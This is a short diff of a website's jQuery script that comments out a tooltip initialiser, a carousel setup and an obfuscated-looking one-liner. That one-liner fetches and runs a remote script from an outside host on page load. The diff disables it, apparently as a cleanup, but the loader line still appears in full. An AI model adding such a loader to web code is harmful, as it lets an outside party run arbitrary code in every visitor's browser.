@@ -16,9 +16,9 @@ $(function () {
 	/* Tooltip
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
-	$(document).ready(function () {
-		$('[data-toggle="tooltip"]').tooltip();
-	});
+	// $(document).ready(function () {
+	// 	$('[data-toggle="tooltip"]').tooltip();
+	// });
 
 
 
@@ -39,7 +39,7 @@ $(function () {
 
 
 
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+	// function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 	/* Toggle sidebar
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
@@ -54,9 +54,9 @@ $(function () {
 	/* Product slider 
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 	// optional
-	$('#blogCarousel').carousel({
-		interval: 5000
-	});
+	// $('#blogCarousel').carousel({
+	// 	interval: 5000
+	// });
 
 
 });
